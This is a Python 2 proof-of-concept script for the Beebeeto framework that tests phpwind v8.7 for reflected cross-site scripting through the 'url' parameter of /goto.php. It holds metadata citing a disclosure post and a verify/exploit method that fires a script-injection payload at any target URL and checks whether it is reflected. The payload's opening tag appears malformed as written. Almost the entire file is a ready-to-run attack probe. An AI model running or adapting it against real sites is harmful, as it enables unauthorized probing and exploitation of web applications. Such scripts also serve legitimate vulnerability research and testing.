#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0104',
            'name': 'phpwind v8.7 /goto.php 跨站脚本漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-05-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwind',
            'vul_version': ['8.7'],
            'type': 'Cross Site Scripting',
            'tag': ['phpwind系统漏洞', '/goto.php漏洞', 'phpwind xss漏洞', 'php'],
            'desc': 'The first programming code flaw occurs at "&url" parameter in "/goto.php?" page.',
            'references': ['http://seclists.org/fulldisclosure/2015/May/106',],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = '%s/goto.php?url=beebee"><to>alert(1)</script>.com/' % args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'url=beebee"><to>alert(1)</script>.com' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())